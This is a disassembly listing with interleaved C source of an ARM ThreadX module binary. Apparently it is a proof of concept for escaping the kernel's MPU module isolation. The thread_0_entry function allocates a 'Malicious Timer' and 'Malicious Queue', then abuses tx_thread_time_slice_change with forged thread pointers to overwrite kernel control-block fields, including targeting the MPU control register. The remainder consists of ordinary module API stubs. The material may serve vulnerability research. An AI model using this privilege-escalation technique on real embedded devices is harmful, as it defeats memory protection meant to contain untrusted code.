
Tx_Module.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .preamble     0000009c  08020000  08020000  00010000  2**4
                  CONTENTS, ALLOC, LOAD, CODE
  1 .dynsym       00000000  0802009c  08021974  00011974  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  2 .dynstr       00000000  0802009c  08021974  00011974  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  3 .rel.dyn      00000000  0802009c  0802009c  0001009c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  4 .got          00000028  08021908  08021908  00011908  2**2
                  CONTENTS, ALLOC, LOAD, RELOC, DATA
  5 .plt          00000000  0802009c  08021974  00011974  2**0
                  CONTENTS, ALLOC, LOAD, CODE
  6 .interp       00000000  0802009c  0802009c  00011974  2**0
                  CONTENTS
  7 .hash         00000000  0802009c  08021974  00011974  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  8 .text         0000186c  0802009c  0802009c  0001009c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  9 .rodata       00000044  08021930  08021930  00011930  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 10 .fast_run     00000000  2001c028  2001c028  00011974  2**0
                  CONTENTS
 11 .data_run     00000000  2001c028  2001c028  00011974  2**0
                  CONTENTS
 12 .bss          0000082c  2001c028  2001c028  0001c028  2**3
                  ALLOC
 13 .heap         00000080  2001c854  2001c854  0001c028  2**0
                  ALLOC
 14 .debug_info   0001c301  00000000  00000000  00011974  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_abbrev 00005a2b  00000000  00000000  0002dc75  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_aranges 00000ca0  00000000  00000000  000336a0  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  0000c422  00000000  00000000  00034340  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   0002d15a  00000000  00000000  00040762  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    00015196  00000000  00000000  0006d8bc  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .comment      00000043  00000000  00000000  00082a52  2**0
                  CONTENTS, READONLY
 21 .ARM.attributes 00000032  00000000  00000000  00082a95  2**0
                  CONTENTS, READONLY
 22 .debug_frame  0000165c  00000000  00000000  00082ac8  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 23 .debug_line_str 000000a1  00000000  00000000  00084124  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .preamble:

08020000 <__preamble_start__>:
 8020000:	4d4f4455 	.word	0x4d4f4455
 8020004:	00000006 	.word	0x00000006
 8020008:	00000001 	.word	0x00000001
 802000c:	00000020 	.word	0x00000020
 8020010:	12345678 	.word	0x12345678
 8020014:	02000007 	.word	0x02000007
 8020018:	00000985 	.word	0x00000985
 802001c:	00000081 	.word	0x00000081
 8020020:	00000000 	.word	0x00000000
 8020024:	00000001 	.word	0x00000001
 8020028:	00000400 	.word	0x00000400
 802002c:	000007e9 	.word	0x000007e9
 8020030:	00000001 	.word	0x00000001
 8020034:	00000400 	.word	0x00000400
 8020038:	00001974 	.word	0x00001974
 802003c:	000008d4 	.word	0x000008d4
	...
 8020080:	00001b41 	.word	0x00001b41
 8020084:	61656100 	.word	0x61656100
 8020088:	01006962 	.word	0x01006962
 802008c:	00000011 	.word	0x00000011
 8020090:	2d453705 	.word	0x2d453705
 8020094:	0d06004d 	.word	0x0d06004d
 8020098:	02094d07 	.word	0x02094d07

Disassembly of section .text:

0802009c <default_module_start>:
void thread_0_entry(ULONG thread_input);
void Error_Handler(void);

/* Module entry function */
void    default_module_start(ULONG id)
{
 802009c:	b580      	push	{r7, lr}
 802009e:	b08c      	sub	sp, #48	; 0x30
 80200a0:	af08      	add	r7, sp, #32
 80200a2:	6078      	str	r0, [r7, #4]
    CHAR    *pointer;

    /* Allocate all the objects. In MPU mode, modules cannot allocate control blocks within
       their own memory area so they cannot corrupt the resident portion of ThreadX by overwriting
       the control block(s).  */
    txm_module_object_allocate((void*)&thread_0, sizeof(TX_THREAD));
 80200a4:	21e8      	movs	r1, #232	; 0xe8
 80200a6:	4b23      	ldr	r3, [pc, #140]	; (8020134 <default_module_start+0x98>)
 80200a8:	f859 3003 	ldr.w	r3, [r9, r3]
 80200ac:	4618      	mov	r0, r3
 80200ae:	f000 fc13 	bl	80208d8 <_txm_module_object_allocate>
    txm_module_object_allocate((void*)&byte_pool_0, sizeof(TX_BYTE_POOL));
 80200b2:	2134      	movs	r1, #52	; 0x34
 80200b4:	4b20      	ldr	r3, [pc, #128]	; (8020138 <default_module_start+0x9c>)
 80200b6:	f859 3003 	ldr.w	r3, [r9, r3]
 80200ba:	4618      	mov	r0, r3
 80200bc:	f000 fc0c 	bl	80208d8 <_txm_module_object_allocate>

    /* Create a byte memory pool from which to allocate the thread stacks.  */
    tx_byte_pool_create(byte_pool_0, "module byte pool 0", (UCHAR*)default_module_pool_space, DEFAULT_BYTE_POOL_SIZE);
 80200c0:	4b1d      	ldr	r3, [pc, #116]	; (8020138 <default_module_start+0x9c>)
 80200c2:	f859 3003 	ldr.w	r3, [r9, r3]
 80200c6:	6818      	ldr	r0, [r3, #0]
 80200c8:	2334      	movs	r3, #52	; 0x34
 80200ca:	9300      	str	r3, [sp, #0]
 80200cc:	f44f 6300 	mov.w	r3, #2048	; 0x800
 80200d0:	4a1a      	ldr	r2, [pc, #104]	; (802013c <default_module_start+0xa0>)
 80200d2:	f859 2002 	ldr.w	r2, [r9, r2]
 80200d6:	491a      	ldr	r1, [pc, #104]	; (8020140 <default_module_start+0xa4>)
 80200d8:	4479      	add	r1, pc
 80200da:	f000 f9d5 	bl	8020488 <_txe_byte_pool_create>

    /* Allocate the stack for thread 0.  */
    tx_byte_allocate(byte_pool_0, (VOID **) &pointer, DEFAULT_STACK_SIZE, TX_NO_WAIT);
 80200de:	4b16      	ldr	r3, [pc, #88]	; (8020138 <default_module_start+0x9c>)
 80200e0:	f859 3003 	ldr.w	r3, [r9, r3]
 80200e4:	6818      	ldr	r0, [r3, #0]
 80200e6:	f107 010c 	add.w	r1, r7, #12
 80200ea:	2300      	movs	r3, #0
 80200ec:	f44f 7200 	mov.w	r2, #512	; 0x200
 80200f0:	f000 f9ac 	bl	802044c <_txe_byte_allocate>

    /* Create the main thread.  */
    tx_thread_create(thread_0, "module thread 0", thread_0_entry, 0,
 80200f4:	4b0f      	ldr	r3, [pc, #60]	; (8020134 <default_module_start+0x98>)
 80200f6:	f859 3003 	ldr.w	r3, [r9, r3]
 80200fa:	6818      	ldr	r0, [r3, #0]
 80200fc:	68fb      	ldr	r3, [r7, #12]
 80200fe:	22e8      	movs	r2, #232	; 0xe8
 8020100:	9206      	str	r2, [sp, #24]
 8020102:	2201      	movs	r2, #1
 8020104:	9205      	str	r2, [sp, #20]
 8020106:	2200      	movs	r2, #0
 8020108:	9204      	str	r2, [sp, #16]
 802010a:	2202      	movs	r2, #2
 802010c:	9203      	str	r2, [sp, #12]
 802010e:	2202      	movs	r2, #2
 8020110:	9202      	str	r2, [sp, #8]
 8020112:	f44f 7200 	mov.w	r2, #512	; 0x200
 8020116:	9201      	str	r2, [sp, #4]
 8020118:	9300      	str	r3, [sp, #0]
 802011a:	2300      	movs	r3, #0
 802011c:	4a09      	ldr	r2, [pc, #36]	; (8020144 <default_module_start+0xa8>)
 802011e:	f859 2002 	ldr.w	r2, [r9, r2]
 8020122:	4909      	ldr	r1, [pc, #36]	; (8020148 <default_module_start+0xac>)
 8020124:	4479      	add	r1, pc
 8020126:	f000 ffa7 	bl	8021078 <_txe_thread_create>
            pointer, DEFAULT_STACK_SIZE,
            2, 2, TX_NO_TIME_SLICE, TX_AUTO_START);

}
 802012a:	bf00      	nop
 802012c:	3710      	adds	r7, #16
 802012e:	46bd      	mov	sp, r7
 8020130:	bd80      	pop	{r7, pc}
 8020132:	bf00      	nop
 8020134:	00000014 	.word	0x00000014
 8020138:	00000010 	.word	0x00000010
 802013c:	0000000c 	.word	0x0000000c
 8020140:	00001854 	.word	0x00001854
 8020144:	00000018 	.word	0x00000018
 8020148:	0000181c 	.word	0x0000181c

0802014c <MaliciousTimerFunction>:

void MaliciousTimerFunction(void){}
 802014c:	b480      	push	{r7}
 802014e:	af00      	add	r7, sp, #0
 8020150:	bf00      	nop
 8020152:	46bd      	mov	sp, r7
 8020154:	f85d 7b04 	ldr.w	r7, [sp], #4
 8020158:	4770      	bx	lr

0802015a <MainThread_Entry>:

void MainThread_Entry(ULONG thread_input){}
 802015a:	b480      	push	{r7}
 802015c:	b083      	sub	sp, #12
 802015e:	af00      	add	r7, sp, #0
 8020160:	6078      	str	r0, [r7, #4]
 8020162:	bf00      	nop
 8020164:	370c      	adds	r7, #12
 8020166:	46bd      	mov	sp, r7
 8020168:	f85d 7b04 	ldr.w	r7, [sp], #4
 802016c:	4770      	bx	lr

0802016e <thread_0_entry>:

/* Module main thread function */
void thread_0_entry(ULONG thread_input)
{
 802016e:	b580      	push	{r7, lr}
 8020170:	b08c      	sub	sp, #48	; 0x30
 8020172:	af04      	add	r7, sp, #16
 8020174:	6078      	str	r0, [r7, #4]
//    Error_Handler();
//  }

  CHAR *pointer;
  TX_TIMER *MaliciousTimer;
  txm_module_object_allocate((void*)&MaliciousTimer, sizeof(TX_TIMER));
 8020176:	f107 0314 	add.w	r3, r7, #20
 802017a:	2134      	movs	r1, #52	; 0x34
 802017c:	4618      	mov	r0, r3
 802017e:	f000 fbab 	bl	80208d8 <_txm_module_object_allocate>
  tx_timer_create(MaliciousTimer, "Malicious Timer", MaliciousTimerFunction, 0x54485244, 0x54485244, 0x54485244, TX_NO_ACTIVATE);
 8020182:	6978      	ldr	r0, [r7, #20]
 8020184:	2334      	movs	r3, #52	; 0x34
 8020186:	9303      	str	r3, [sp, #12]
 8020188:	2300      	movs	r3, #0
 802018a:	9302      	str	r3, [sp, #8]
 802018c:	4b36      	ldr	r3, [pc, #216]	; (8020268 <thread_0_entry+0xfa>)
 802018e:	9301      	str	r3, [sp, #4]
 8020190:	4b35      	ldr	r3, [pc, #212]	; (8020268 <thread_0_entry+0xfa>)
 8020192:	9300      	str	r3, [sp, #0]
 8020194:	4b34      	ldr	r3, [pc, #208]	; (8020268 <thread_0_entry+0xfa>)
 8020196:	4a36      	ldr	r2, [pc, #216]	; (8020270 <thread_0_entry+0x102>)
 8020198:	f859 2002 	ldr.w	r2, [r9, r2]
 802019c:	4935      	ldr	r1, [pc, #212]	; (8020274 <thread_0_entry+0x106>)
 802019e:	4479      	add	r1, pc
 80201a0:	f001 f9b6 	bl	8021510 <_txe_timer_create>

  TX_QUEUE *MaliciousQueue;
  txm_module_object_allocate((void*)&MaliciousQueue, sizeof(TX_QUEUE));
 80201a4:	f107 0310 	add.w	r3, r7, #16
 80201a8:	2144      	movs	r1, #68	; 0x44
 80201aa:	4618      	mov	r0, r3
 80201ac:	f000 fb94 	bl	80208d8 <_txm_module_object_allocate>
  tx_byte_allocate(byte_pool_0, (VOID **) &pointer, 16 * sizeof(ULONG), TX_NO_WAIT);
 80201b0:	4b31      	ldr	r3, [pc, #196]	; (8020278 <thread_0_entry+0x10a>)
 80201b2:	f859 3003 	ldr.w	r3, [r9, r3]
 80201b6:	6818      	ldr	r0, [r3, #0]
 80201b8:	f107 0118 	add.w	r1, r7, #24
 80201bc:	2300      	movs	r3, #0
 80201be:	2240      	movs	r2, #64	; 0x40
 80201c0:	f000 f944 	bl	802044c <_txe_byte_allocate>
  tx_queue_create(MaliciousQueue, "Malicious Queue",TX_1_ULONG, pointer, 16 * sizeof(ULONG));
 80201c4:	6938      	ldr	r0, [r7, #16]
 80201c6:	69bb      	ldr	r3, [r7, #24]
 80201c8:	2244      	movs	r2, #68	; 0x44
 80201ca:	9201      	str	r2, [sp, #4]
 80201cc:	2240      	movs	r2, #64	; 0x40
 80201ce:	9200      	str	r2, [sp, #0]
 80201d0:	2201      	movs	r2, #1
 80201d2:	492a      	ldr	r1, [pc, #168]	; (802027c <thread_0_entry+0x10e>)
 80201d4:	4479      	add	r1, pc
 80201d6:	f000 fd21 	bl	8020c1c <_txe_queue_create>

  // write to privileged kernel memory
  MaliciousTimer->tx_timer_id = 0xffffffff;
 80201da:	697b      	ldr	r3, [r7, #20]
 80201dc:	f04f 32ff 	mov.w	r2, #4294967295
 80201e0:	601a      	str	r2, [r3, #0]

  ULONG time_slice;
  TX_THREAD *ForgedThread;
  // write queue_write
  ForgedThread = (ULONG) MaliciousTimer + 8;
 80201e2:	697b      	ldr	r3, [r7, #20]
 80201e4:	3308      	adds	r3, #8
 80201e6:	61fb      	str	r3, [r7, #28]
  tx_thread_time_slice_change(ForgedThread, 0x54485244, &time_slice);
 80201e8:	f107 030c 	add.w	r3, r7, #12
 80201ec:	461a      	mov	r2, r3
 80201ee:	491e      	ldr	r1, [pc, #120]	; (8020268 <thread_0_entry+0xfa>)
 80201f0:	69f8      	ldr	r0, [r7, #28]
 80201f2:	f001 f909 	bl	8021408 <_txe_thread_time_slice_change>
  ForgedThread = (ULONG) MaliciousTimer + 32;
 80201f6:	697b      	ldr	r3, [r7, #20]
 80201f8:	3320      	adds	r3, #32
 80201fa:	61fb      	str	r3, [r7, #28]
  tx_thread_time_slice_change(ForgedThread, 0x54485244, &time_slice);
 80201fc:	f107 030c 	add.w	r3, r7, #12
 8020200:	461a      	mov	r2, r3
 8020202:	4919      	ldr	r1, [pc, #100]	; (8020268 <thread_0_entry+0xfa>)
 8020204:	69f8      	ldr	r0, [r7, #28]
 8020206:	f001 f8ff 	bl	8021408 <_txe_thread_time_slice_change>
  ForgedThread = (ULONG) MaliciousTimer + 56;
 802020a:	697b      	ldr	r3, [r7, #20]
 802020c:	3338      	adds	r3, #56	; 0x38
 802020e:	61fb      	str	r3, [r7, #28]
  tx_thread_time_slice_change(ForgedThread, 0x54485244, &time_slice);
 8020210:	f107 030c 	add.w	r3, r7, #12
 8020214:	461a      	mov	r2, r3
 8020216:	4914      	ldr	r1, [pc, #80]	; (8020268 <thread_0_entry+0xfa>)
 8020218:	69f8      	ldr	r0, [r7, #28]
 802021a:	f001 f8f5 	bl	8021408 <_txe_thread_time_slice_change>
  ForgedThread = (ULONG) MaliciousTimer + 84;
 802021e:	697b      	ldr	r3, [r7, #20]
 8020220:	3354      	adds	r3, #84	; 0x54
 8020222:	61fb      	str	r3, [r7, #28]
  tx_thread_time_slice_change(ForgedThread, 0xe000ed94, &time_slice);
 8020224:	f107 030c 	add.w	r3, r7, #12
 8020228:	461a      	mov	r2, r3
 802022a:	4910      	ldr	r1, [pc, #64]	; (802026c <thread_0_entry+0xfe>)
 802022c:	69f8      	ldr	r0, [r7, #28]
 802022e:	f001 f8eb 	bl	8021408 <_txe_thread_time_slice_change>
  // write queue_message_size
  ForgedThread = (ULONG) MaliciousTimer + 56;
 8020232:	697b      	ldr	r3, [r7, #20]
 8020234:	3338      	adds	r3, #56	; 0x38
 8020236:	61fb      	str	r3, [r7, #28]
  tx_thread_time_slice_change(ForgedThread, 0x4, &time_slice);
 8020238:	f107 030c 	add.w	r3, r7, #12
 802023c:	461a      	mov	r2, r3
 802023e:	2104      	movs	r1, #4
 8020240:	69f8      	ldr	r0, [r7, #28]
 8020242:	f001 f8e1 	bl	8021408 <_txe_thread_time_slice_change>

  ULONG value = 0;
 8020246:	2300      	movs	r3, #0
 8020248:	60bb      	str	r3, [r7, #8]
  //dereference queue_write in queue object
  tx_queue_send(MaliciousQueue, &value, 0);
 802024a:	693b      	ldr	r3, [r7, #16]
 802024c:	f107 0108 	add.w	r1, r7, #8
 8020250:	2200      	movs	r2, #0
 8020252:	4618      	mov	r0, r3
 8020254:	f000 fde0 	bl	8020e18 <_txe_queue_send>

  // write to privileged kernel memory
  MaliciousTimer->tx_timer_id = 0xffffffff;
 8020258:	697b      	ldr	r3, [r7, #20]
 802025a:	f04f 32ff 	mov.w	r2, #4294967295
 802025e:	601a      	str	r2, [r3, #0]
//  *(ULONG *)READONLY_REGION = 0xABABABAB;
//  tx_thread_sleep(TX_TIMER_TICKS_PER_SECOND / 10);
//
//  /* Suppress unused variable warning */
//  UNUSED(readbuffer);
}
 8020260:	bf00      	nop
 8020262:	3720      	adds	r7, #32
 8020264:	46bd      	mov	sp, r7
 8020266:	bd80      	pop	{r7, pc}
 8020268:	54485244 	.word	0x54485244
 802026c:	e000ed94 	.word	0xe000ed94
 8020270:	00000000 	.word	0x00000000
 8020274:	000017b2 	.word	0x000017b2
 8020278:	00000010 	.word	0x00000010
 802027c:	0000178c 	.word	0x0000178c

08020280 <Error_Handler>:

void Error_Handler(void)
{
 8020280:	b580      	push	{r7, lr}
 8020282:	af00      	add	r7, sp, #0
  /* Nothing to do, block here */
  tx_thread_sleep(TX_WAIT_FOREVER);
 8020284:	f04f 30ff 	mov.w	r0, #4294967295
 8020288:	f001 f866 	bl	8021358 <_tx_thread_sleep>
}
 802028c:	bf00      	nop
 802028e:	bd80      	pop	{r7, pc}

08020290 <_txe_block_allocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_allocate(TX_BLOCK_POOL *pool_ptr, VOID **block_ptr, ULONG wait_option)
{
 8020290:	b590      	push	{r4, r7, lr}
 8020292:	b087      	sub	sp, #28
 8020294:	af00      	add	r7, sp, #0
 8020296:	60f8      	str	r0, [r7, #12]
 8020298:	60b9      	str	r1, [r7, #8]
 802029a:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_ALLOCATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) block_ptr, (ALIGN_TYPE) wait_option);
 802029c:	4b07      	ldr	r3, [pc, #28]	; (80202bc <_txe_block_allocate+0x2c>)
 802029e:	f859 3003 	ldr.w	r3, [r9, r3]
 80202a2:	681c      	ldr	r4, [r3, #0]
 80202a4:	68f9      	ldr	r1, [r7, #12]
 80202a6:	68ba      	ldr	r2, [r7, #8]
 80202a8:	687b      	ldr	r3, [r7, #4]
 80202aa:	2001      	movs	r0, #1
 80202ac:	47a0      	blx	r4
 80202ae:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80202b0:	697b      	ldr	r3, [r7, #20]
}
 80202b2:	4618      	mov	r0, r3
 80202b4:	371c      	adds	r7, #28
 80202b6:	46bd      	mov	sp, r7
 80202b8:	bd90      	pop	{r4, r7, pc}
 80202ba:	bf00      	nop
 80202bc:	00000004 	.word	0x00000004

080202c0 <_txe_block_pool_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_pool_create(TX_BLOCK_POOL *pool_ptr, CHAR *name_ptr, ULONG block_size, VOID *pool_start, ULONG pool_size, UINT pool_control_block_size)
{
 80202c0:	b590      	push	{r4, r7, lr}
 80202c2:	b08b      	sub	sp, #44	; 0x2c
 80202c4:	af00      	add	r7, sp, #0
 80202c6:	60f8      	str	r0, [r7, #12]
 80202c8:	60b9      	str	r1, [r7, #8]
 80202ca:	607a      	str	r2, [r7, #4]
 80202cc:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) block_size;
 80202ce:	687b      	ldr	r3, [r7, #4]
 80202d0:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) pool_start;
 80202d2:	683b      	ldr	r3, [r7, #0]
 80202d4:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) pool_size;
 80202d6:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80202d8:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) pool_control_block_size;
 80202da:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80202dc:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_CREATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 80202de:	4b08      	ldr	r3, [pc, #32]	; (8020300 <_txe_block_pool_create+0x40>)
 80202e0:	f859 3003 	ldr.w	r3, [r9, r3]
 80202e4:	681c      	ldr	r4, [r3, #0]
 80202e6:	68f9      	ldr	r1, [r7, #12]
 80202e8:	68ba      	ldr	r2, [r7, #8]
 80202ea:	f107 0314 	add.w	r3, r7, #20
 80202ee:	2002      	movs	r0, #2
 80202f0:	47a0      	blx	r4
 80202f2:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 80202f4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 80202f6:	4618      	mov	r0, r3
 80202f8:	372c      	adds	r7, #44	; 0x2c
 80202fa:	46bd      	mov	sp, r7
 80202fc:	bd90      	pop	{r4, r7, pc}
 80202fe:	bf00      	nop
 8020300:	00000004 	.word	0x00000004

08020304 <_txe_block_pool_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_pool_delete(TX_BLOCK_POOL *pool_ptr)
{
 8020304:	b590      	push	{r4, r7, lr}
 8020306:	b085      	sub	sp, #20
 8020308:	af00      	add	r7, sp, #0
 802030a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_DELETE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 802030c:	4b07      	ldr	r3, [pc, #28]	; (802032c <_txe_block_pool_delete+0x28>)
 802030e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020312:	681c      	ldr	r4, [r3, #0]
 8020314:	6879      	ldr	r1, [r7, #4]
 8020316:	2300      	movs	r3, #0
 8020318:	2200      	movs	r2, #0
 802031a:	2003      	movs	r0, #3
 802031c:	47a0      	blx	r4
 802031e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020320:	68fb      	ldr	r3, [r7, #12]
}
 8020322:	4618      	mov	r0, r3
 8020324:	3714      	adds	r7, #20
 8020326:	46bd      	mov	sp, r7
 8020328:	bd90      	pop	{r4, r7, pc}
 802032a:	bf00      	nop
 802032c:	00000004 	.word	0x00000004

08020330 <_txe_block_pool_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_pool_info_get(TX_BLOCK_POOL *pool_ptr, CHAR **name, ULONG *available_blocks, ULONG *total_blocks, TX_THREAD **first_suspended, ULONG *suspended_count, TX_BLOCK_POOL **next_pool)
{
 8020330:	b590      	push	{r4, r7, lr}
 8020332:	b08b      	sub	sp, #44	; 0x2c
 8020334:	af00      	add	r7, sp, #0
 8020336:	60f8      	str	r0, [r7, #12]
 8020338:	60b9      	str	r1, [r7, #8]
 802033a:	607a      	str	r2, [r7, #4]
 802033c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) available_blocks;
 802033e:	687b      	ldr	r3, [r7, #4]
 8020340:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) total_blocks;
 8020342:	683b      	ldr	r3, [r7, #0]
 8020344:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 8020346:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020348:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 802034a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 802034c:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_pool;
 802034e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020350:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020352:	4b08      	ldr	r3, [pc, #32]	; (8020374 <_txe_block_pool_info_get+0x44>)
 8020354:	f859 3003 	ldr.w	r3, [r9, r3]
 8020358:	681c      	ldr	r4, [r3, #0]
 802035a:	68f9      	ldr	r1, [r7, #12]
 802035c:	68ba      	ldr	r2, [r7, #8]
 802035e:	f107 0310 	add.w	r3, r7, #16
 8020362:	2004      	movs	r0, #4
 8020364:	47a0      	blx	r4
 8020366:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020368:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 802036a:	4618      	mov	r0, r3
 802036c:	372c      	adds	r7, #44	; 0x2c
 802036e:	46bd      	mov	sp, r7
 8020370:	bd90      	pop	{r4, r7, pc}
 8020372:	bf00      	nop
 8020374:	00000004 	.word	0x00000004

08020378 <_tx_block_pool_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_block_pool_performance_info_get(TX_BLOCK_POOL *pool_ptr, ULONG *allocates, ULONG *releases, ULONG *suspensions, ULONG *timeouts)
{
 8020378:	b590      	push	{r4, r7, lr}
 802037a:	b089      	sub	sp, #36	; 0x24
 802037c:	af00      	add	r7, sp, #0
 802037e:	60f8      	str	r0, [r7, #12]
 8020380:	60b9      	str	r1, [r7, #8]
 8020382:	607a      	str	r2, [r7, #4]
 8020384:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) releases;
 8020386:	687b      	ldr	r3, [r7, #4]
 8020388:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 802038a:	683b      	ldr	r3, [r7, #0]
 802038c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 802038e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8020390:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) allocates, (ALIGN_TYPE) extra_parameters);
 8020392:	4b08      	ldr	r3, [pc, #32]	; (80203b4 <_tx_block_pool_performance_info_get+0x3c>)
 8020394:	f859 3003 	ldr.w	r3, [r9, r3]
 8020398:	681c      	ldr	r4, [r3, #0]
 802039a:	68f9      	ldr	r1, [r7, #12]
 802039c:	68ba      	ldr	r2, [r7, #8]
 802039e:	f107 0310 	add.w	r3, r7, #16
 80203a2:	2005      	movs	r0, #5
 80203a4:	47a0      	blx	r4
 80203a6:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80203a8:	69fb      	ldr	r3, [r7, #28]
}
 80203aa:	4618      	mov	r0, r3
 80203ac:	3724      	adds	r7, #36	; 0x24
 80203ae:	46bd      	mov	sp, r7
 80203b0:	bd90      	pop	{r4, r7, pc}
 80203b2:	bf00      	nop
 80203b4:	00000004 	.word	0x00000004

080203b8 <_tx_block_pool_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_block_pool_performance_system_info_get(ULONG *allocates, ULONG *releases, ULONG *suspensions, ULONG *timeouts)
{
 80203b8:	b590      	push	{r4, r7, lr}
 80203ba:	b089      	sub	sp, #36	; 0x24
 80203bc:	af00      	add	r7, sp, #0
 80203be:	60f8      	str	r0, [r7, #12]
 80203c0:	60b9      	str	r1, [r7, #8]
 80203c2:	607a      	str	r2, [r7, #4]
 80203c4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 80203c6:	687b      	ldr	r3, [r7, #4]
 80203c8:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 80203ca:	683b      	ldr	r3, [r7, #0]
 80203cc:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) allocates, (ALIGN_TYPE) releases, (ALIGN_TYPE) extra_parameters);
 80203ce:	4b08      	ldr	r3, [pc, #32]	; (80203f0 <_tx_block_pool_performance_system_info_get+0x38>)
 80203d0:	f859 3003 	ldr.w	r3, [r9, r3]
 80203d4:	681c      	ldr	r4, [r3, #0]
 80203d6:	68f9      	ldr	r1, [r7, #12]
 80203d8:	68ba      	ldr	r2, [r7, #8]
 80203da:	f107 0314 	add.w	r3, r7, #20
 80203de:	2006      	movs	r0, #6
 80203e0:	47a0      	blx	r4
 80203e2:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80203e4:	69fb      	ldr	r3, [r7, #28]
}
 80203e6:	4618      	mov	r0, r3
 80203e8:	3724      	adds	r7, #36	; 0x24
 80203ea:	46bd      	mov	sp, r7
 80203ec:	bd90      	pop	{r4, r7, pc}
 80203ee:	bf00      	nop
